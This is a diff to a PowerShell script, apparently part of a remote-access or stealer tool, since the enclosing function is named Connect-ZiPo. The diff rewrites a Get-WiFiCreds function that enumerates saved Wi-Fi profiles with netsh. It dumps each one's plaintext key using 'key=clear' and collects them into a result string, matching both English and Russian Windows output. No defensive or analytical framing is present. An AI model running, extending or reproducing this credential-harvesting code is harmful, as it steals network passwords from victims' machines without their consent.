@@ -84,46 +84,21 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        $rawFile = "$env:TEMP\wifi_raw.txt"
-        $utfFile = "$env:TEMP\wifi_utf.txt"
+        $output = cmd /c "netsh wlan show profiles" | Out-String
+        $profiles = $output -split "`n" | Where-Object { $_ -match "Все профили пользователей" -or $_ -match "All User Profile" }
 
-        # Получаем список профилей
-        cmd /c "netsh wlan show profiles > `"$rawFile`"" | Out-Null
-
-        # Принудительно перекодируем из OEM в UTF-8
-        $bytes = [System.IO.File]::ReadAllBytes($rawFile)
-        $text = [System.Text.Encoding]::GetEncoding(866).GetString($bytes)
-        [System.IO.File]::WriteAllText($utfFile, $text, [System.Text.Encoding]::UTF8)
-
-        # Читаем уже нормальный текст
-        $lines = Get-Content $utfFile -Encoding UTF8
-        $profiles = $lines | Where-Object { $_ -like "*:*" -and $_ -match "Profile" }
-
-        if (-not $profiles -or $profiles.Count -eq 0) {
-            return "[INFO] No Wi-Fi profiles found."
+        if (-not $profiles) {
+            return "[INFO] No Wi-Fi profiles found (adapter may be disabled or unavailable)."
         }
 
         $results = ""
         foreach ($line in $profiles) {
-            $parts = $line -split ":", 2
-            if ($parts.Count -lt 2) { continue }
-            $profile = $parts[1].Trim()
-
+            $profile = ($line -split ":")[1].Trim()
             $results += "`n[$profile]`n"
-
-            $rawDetail = "$env:TEMP\wifi_detail_raw.txt"
-            $utfDetail = "$env:TEMP\wifi_detail_utf.txt"
-
-            cmd /c "netsh wlan show profile name=""$profile"" key=clear > `"$rawDetail`"" | Out-Null
-            $bytes2 = [System.IO.File]::ReadAllBytes($rawDetail)
-            $text2 = [System.Text.Encoding]::GetEncoding(866).GetString($bytes2)
-            [System.IO.File]::WriteAllText($utfDetail, $text2, [System.Text.Encoding]::UTF8)
-
-            $detailLines = Get-Content $utfDetail -Encoding UTF8
-            $keyLine = $detailLines | Where-Object { $_ -like "*Key Content*" -or $_ -like "*Содержимое ключа*" }
-
-            if ($keyLine) {
-                $results += ($keyLine -join "`n")
+            $details = cmd /c "netsh wlan show profile name=""$profile"" key=clear" | Out-String
+            $key = ($details -split "`n") | Where-Object { $_ -match "Содержимое ключа|Key Content" }
+            if ($key) {
+                $results += ($key -join "`n")
             } else {
                 $results += "[!] No key found"
             }
